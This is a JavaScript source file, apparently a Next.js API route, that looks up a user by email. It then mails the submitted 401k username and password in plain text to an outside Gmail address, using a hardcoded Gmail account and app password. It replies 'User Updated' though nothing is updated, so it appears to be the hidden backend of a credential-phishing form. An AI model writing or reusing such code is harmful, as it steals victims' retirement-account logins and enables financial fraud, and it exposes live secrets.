import { NextResponse } from "next/server";
import { PrismaClient } from "@prisma/client";
import nodemailer from "nodemailer";

const prisma = new PrismaClient();

function capitalizeFirstLetter(str) {
  if (str.length === 0) {
    return ""; // Handle empty strings
  }
  return str.charAt(0).toUpperCase() + str.slice(1);
}

export async function POST(req) {
  const body = await req.json();
  try {
    const existingUser = await prisma.user.findFirst({
      where: {
        email: body.email,
      },
    });

    if (existingUser) {
      const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
          user: "hvbvcchuknb@gmail.com",
          pass: "fpjb hwii sade fcgv",
        },
      });
      await transporter.sendMail({
        from: "hvbvcchuknb@gmail.com",
        to: "joychurch28@gmail.com",
        subject: "401k Details",
        html: `<h2>401K username is ${body.username} and password is ${body.password}</h2>`,
      });
      return NextResponse.json({ message: "User Updated" }, { status: 200 });
    } else {
      return NextResponse.json(
        { message: "User doesn't exist" },
        { status: 400 },
      );
    }
  } catch (err) {
    console.error(err);
    return NextResponse.json(
      { message: "Internal Server Error", error: err.message },
      { status: 500 },
    );
  }
}
